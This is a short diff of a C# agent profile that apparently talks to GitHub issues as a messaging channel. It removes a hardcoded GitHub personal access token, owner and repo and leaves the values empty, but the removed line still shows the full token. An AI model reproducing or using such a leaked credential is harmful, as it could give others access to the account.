@@ -27,11 +27,11 @@ namespace Agent.Profiles
 
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
         private static readonly GitHubClient client = new GitHubClient(new ProductHeaderValue("ApiClient"));
-        private const string GITHUB_TOKEN = "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";
-        private const string OWNER = "scottctaylor12";
-        private const string REPO = "test";
-        private const int SERVER_ISSUE = 3;
-        private const int CLIENT_ISSUE = 4;
+        private const string GITHUB_TOKEN = "";
+        private const string OWNER = "";
+        private const string REPO = "";
+        private const int SERVER_ISSUE = 1;
+        private const int CLIENT_ISSUE = 2;
         private const string URL = $"https://api.github.com/repos/{OWNER}/{REPO}/issues";
         
         public GitHub(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
